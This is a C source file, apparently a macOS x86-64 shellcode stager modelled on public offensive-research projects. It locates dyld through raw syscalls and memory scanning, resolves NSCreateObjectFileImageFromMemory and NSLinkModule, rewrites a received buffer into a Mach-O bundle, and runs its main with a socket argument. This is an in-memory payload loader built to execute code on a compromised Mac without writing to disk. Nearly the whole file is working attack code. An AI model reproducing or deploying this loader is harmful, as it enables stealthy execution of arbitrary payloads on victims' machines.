/*
 * References:
 * @parchedmind
 * https://github.com/CylanceVulnResearch/osx_runbin/blob/master/run_bin.c
 *
 * @nologic
 * https://github.com/nologic/shellcc
 */

#include <stdio.h>
#include <string.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#include <sys/types.h>
#include <sys/sysctl.h>

struct dyld_cache_header
{
  char     magic[16];
  uint32_t  mappingOffset;
  uint32_t  mappingCount;
  uint32_t  imagesOffsetOld;
  uint32_t  imagesCountOld;
  uint64_t  dyldBaseAddress;
  uint64_t  codeSignatureOffset;
  uint64_t  codeSignatureSize;
  uint64_t  slideInfoOffsetUnused;
  uint64_t  slideInfoSizeUnused;
  uint64_t  localSymbolsOffset;
  uint64_t  localSymbolsSize;
  uint8_t   uuid[16];
  uint64_t  cacheType;
  uint32_t  branchPoolsOffset;
  uint32_t  branchPoolsCount;
  uint64_t  accelerateInfoAddr;
  uint64_t  accelerateInfoSize;
  uint64_t  imagesTextOffset;
  uint64_t  imagesTextCount;
  uint64_t  patchInfoAddr;
  uint64_t  patchInfoSize;
  uint64_t  otherImageGroupAddrUnused;
  uint64_t  otherImageGroupSizeUnused;
  uint64_t  progClosuresAddr;
  uint64_t  progClosuresSize;
  uint64_t  progClosuresTrieAddr;
  uint64_t  progClosuresTrieSize;
  uint32_t  platform;
  uint32_t  formatVersion          : 8,
            dylibsExpectedOnDisk   : 1,
            simulator              : 1,
            locallyBuiltCache      : 1,
            builtFromChainedFixups : 1,
            padding                : 20;
  uint64_t  sharedRegionStart;
  uint64_t  sharedRegionSize;
  uint64_t  maxSlide;
  uint64_t  dylibsImageArrayAddr;
  uint64_t  dylibsImageArraySize;
  uint64_t  dylibsTrieAddr;
  uint64_t  dylibsTrieSize;
  uint64_t  otherImageArrayAddr;
  uint64_t  otherImageArraySize;
  uint64_t  otherTrieAddr;
  uint64_t  otherTrieSize;
  uint32_t  mappingWithSlideOffset;
  uint32_t  mappingWithSlideCount;
  uint64_t  dylibsPBLStateArrayAddrUnused;
  uint64_t  dylibsPBLSetAddr;
  uint64_t  programsPBLSetPoolAddr;
  uint64_t  programsPBLSetPoolSize;
  uint64_t  programTrieAddr;
  uint32_t  programTrieSize;
  uint32_t  osVersion;
  uint32_t  altPlatform;
  uint32_t  altOsVersion;
  uint64_t  swiftOptsOffset;
  uint64_t  swiftOptsSize;
  uint32_t  subCacheArrayOffset;
  uint32_t  subCacheArrayCount;
  uint8_t   symbolFileUUID[16];
  uint64_t  rosettaReadOnlyAddr;
  uint64_t  rosettaReadOnlySize;
  uint64_t  rosettaReadWriteAddr;
  uint64_t  rosettaReadWriteSize;
  uint32_t  imagesOffset;
  uint32_t  imagesCount;
};

struct dyld_cache_mapping_info {
  uint64_t  address;
  uint64_t  size;
  uint64_t  fileOffset;
  uint32_t  maxProt;
  uint32_t  initProt;
};

struct dyld_cache_image_info
{
  uint64_t  address;
  uint64_t  modTime;
  uint64_t  inode;
  uint32_t  pathFileOffset;
  uint32_t  pad;
};

struct shared_file_mapping
{
  uint64_t  address;
  uint64_t  size;
  uint64_t  file_offset;
  uint32_t  max_prot;
  uint32_t  init_prot;
};

typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);

typedef NSSymbol (*NSLookupSymbolInModule_ptr)(NSModule module, const char *symbolName);
typedef void * (*NSAddressOfSymbol_ptr)(NSSymbol symbol);

uint64_t find_macho(uint64_t addr, unsigned int increment);
uint64_t find_dylib(uint64_t addr, unsigned int increment);
uint64_t find_symbol(uint64_t base, char* symbol, uint64_t offset);
int string_compare(const char* s1, const char* s2);
int detect_sierra();
uint64_t syscall_shared_region_check_np();

/*#define DEBUG*/
#ifdef DEBUG
static void print(char * str);
#endif

#define DYLD_BASE_ADDR 0x00007fff5fc00000
#define MAX_OSXVM_ADDR 0x00007ffffffff000

int main(int argc, char** argv)
{
#ifdef DEBUG
  print("main!\n");
#endif
  uint64_t buffer = 0;
  uint64_t buffer_size = 0;
  __asm__(
      "movq %%r10, %0;\n"
      "movq %%r12, %1;\n"
      : "=g"(buffer), "=g"(buffer_size));

#ifdef DEBUG
  print("hello world!\n");
#endif

  int sierra = detect_sierra();
  uint64_t binary = DYLD_BASE_ADDR;
  uint64_t dyld;
  uint64_t offset;
  if (sierra) {
    uint64_t shared_region_start = syscall_shared_region_check_np();

    struct dyld_cache_header *header = (void*)shared_region_start;
    uint32_t imagesCount = header->imagesCountOld;
    if (imagesCount == 0) {
      imagesCount = header->imagesCount;
    }
    struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
    uint32_t imagesOffset = header->imagesOffsetOld;
    if (imagesOffset == 0) {
      imagesOffset = header->imagesOffset;
    }
    struct dyld_cache_image_info *dcimg = (void*)header + imagesOffset;
    for (size_t i=0; i < imagesCount; i++) {
      char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;
      if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
        dyld = dcimg->address;
        break;
      }
      dcimg++;
    }
    offset = (uint64_t)header - sfm->address;
    dyld += offset;
  } else {
    dyld = find_macho(binary, 0x1000);
    offset = dyld - DYLD_BASE_ADDR;
  }
  if (!dyld) {
    return 1;
  }

  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory", offset);
  while (!NSCreateObjectFileImageFromMemory_func) {
    if (sierra) {
      dyld = find_dylib(dyld + 0x1000, 0x1000);
    } else {
      dyld = find_macho(dyld + 0x1000, 0x1000);
      offset = dyld - DYLD_BASE_ADDR;
    }
    if (!dyld) {
      return 1;
    }
    NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory", offset);
  } 
#ifdef DEBUG
  print("good symbol!\n");
#endif

  NSLinkModule_ptr NSLinkModule_func = (void*)find_symbol(dyld, "_NSLinkModule", offset);
  if (!NSLinkModule_func) {
    return 1;
  } 

  NSLookupSymbolInModule_ptr NSLookupSymbolInModule_func = (void*)find_symbol(dyld, "_NSLookupSymbolInModule", offset);
  if (!NSLookupSymbolInModule_func) {
    return 1;
  }

  NSAddressOfSymbol_ptr NSAddressOfSymbol_func = (void*)find_symbol(dyld, "_NSAddressOfSymbol", offset);
  if (!NSAddressOfSymbol_func) {
    return 1;
  }

  /*if (*(char*)buffer == 'b') {*/
  /*print("magic b!\n");*/
  /*}*/
  *(char*)buffer = '\xcf';
  ((uint32_t *)buffer)[3] = MH_BUNDLE;

  NSObjectFileImage fi = 0; 
  if (NSCreateObjectFileImageFromMemory_func((void*)buffer, buffer_size, &fi) != 1) {
    return 1;
  }
#ifdef DEBUG
  print("created!\n");
#endif

  NSModule nm = NSLinkModule_func(fi, "", NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW | NSLINKMODULE_OPTION_RETURN_ON_ERROR);
  if (!nm) {
#ifdef DEBUG
    print("no nm!\n");
#endif
    return 1;
  }
#ifdef DEBUG
  print("good nm!\n");
#endif

  NSSymbol sym_main = NSLookupSymbolInModule_func(nm, "_main");
  if (!sym_main) {
    return 1;
  }

  void * addr_main = NSAddressOfSymbol_func(sym_main);
  if (!addr_main) {
    return 1;
  }

#ifdef DEBUG
  print("found main!\n");
#endif

  int(*main_func)(int, char**) = (int(*)(int, char**))addr_main;
  char* socket = (char*)(size_t)argc;
  char *new_argv[] = { "m", socket, NULL };
  int new_argc = 2;
  return main_func(new_argc, new_argv);
}

uint64_t find_symbol(uint64_t base, char* symbol, uint64_t offset)
{
  struct segment_command_64 *sc, *linkedit, *text;
  struct load_command *lc;
  struct symtab_command *symtab;
  struct nlist_64 *nl;

  char *strtab;
  symtab = 0;
  linkedit = 0;
  text = 0;

  lc = (struct load_command *)(base + sizeof(struct mach_header_64));
  for (int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
    if (lc->cmd == LC_SYMTAB) {
      symtab = (struct symtab_command *)lc;
    } else if (lc->cmd == LC_SEGMENT_64) {
      sc = (struct segment_command_64 *)lc;
      char * segname = ((struct segment_command_64 *)lc)->segname;
      if (string_compare(segname, "__LINKEDIT") == 0) {
        linkedit = sc;
      } else if (string_compare(segname, "__TEXT") == 0) {
        text = sc;
      }
    }
    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  if (!linkedit || !symtab || !text) {
    return 0;
  }

  unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
  strtab = (char *)(base + file_slide + symtab->stroff);

  nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
  for (int i=0; i<symtab->nsyms; i++) {
    char *name = strtab + nl[i].n_un.n_strx;
    /*#ifdef DEBUG*/
    /*print(name);*/
    /*print("\n");*/
    /*#endif*/
    if (string_compare(name, symbol) == 0) {
      return nl[i].n_value + offset;
    }
  }

  return 0;
}

uint64_t syscall_chmod(uint64_t path, long mode) 
{
  uint64_t chmod_no = 0x200000f;
  uint64_t ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(chmod_no), "S"(path), "g"(mode)
      :);
  return ret;
}

uint64_t find_macho(uint64_t addr, unsigned int increment)
{
  while(addr < MAX_OSXVM_ADDR) {
    uint64_t ptr = addr;
    unsigned long ret = syscall_chmod(ptr, 0777);
    if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_64) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

uint64_t find_dylib(uint64_t addr, unsigned int increment)
{
  while(addr < MAX_OSXVM_ADDR) {
    uint64_t ptr = addr;
    if (((int *)ptr)[0] == MH_MAGIC_64 && ((int *) ptr)[3] == MH_DYLIB) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

int string_compare(const char* s1, const char* s2) 
{
  while (*s1 != '\0' && *s1 == *s2)
  {
    s1++;
    s2++;
  }
  return (*(unsigned char *) s1) - (*(unsigned char *) s2);
}

int detect_sierra()
{
  uint64_t sc_sysctl = 0x20000ca;
  int name[] = { CTL_KERN, KERN_OSRELEASE };
  uint64_t nameptr = (uint64_t)&name;
  uint64_t namelen = sizeof(name)/sizeof(name[0]);
  char osrelease[32];
  size_t size = sizeof(osrelease);
  uint64_t valptr = (uint64_t)osrelease;
  uint64_t valsizeptr = (uint64_t)&size;
  uint64_t ret = 0;

  __asm__(
      "mov %1, %%rax;\n"
      "mov %2, %%rdi;\n"
      "mov %3, %%rsi;\n"
      "mov %4, %%rdx;\n"
      "mov %5, %%r10;\n"
      "xor %%r8, %%r8;\n"
      "xor %%r9, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(ret)
      : "g"(sc_sysctl), "g"(nameptr), "g"(namelen), "g"(valptr), "g"(valsizeptr)
      : );

  // osrelease is 16.x.x on Sierra
  if (ret == 0 && size > 2) {
    if (osrelease[0] == '1' && osrelease[1] < '6') {
      return 0;
    }
    if (osrelease[0] <= '9' && osrelease[1] == '.') {
      return 0;
    }
  }
  return 1;
}

uint64_t syscall_shared_region_check_np()
{
  long shared_region_check_np = 0x2000126; // #294
  uint64_t address = 0;
  unsigned long ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(shared_region_check_np), "g"(&address)
      : "rax", "rdi" );
  return address;
}

#ifdef DEBUG
int string_len(const char* s1) 
{
  const char* s2 = s1;
  while (*s2 != '\0')
  {
    s2++;
  }
  return (s2 - s1);
}

void print(char * str) 
{
  long write = 0x2000004;
  long stdout = 1;
  unsigned long len = string_len(str);
  unsigned long long addr = (unsigned long long) str;
  unsigned long ret = 0;
  /* ret = write(stdout, str, len); */
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "movq %4, %%rdx;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(write), "g"(stdout), "S"(addr), "g"(len)
      : "rax", "rdi", "rdx" );
}
#endif
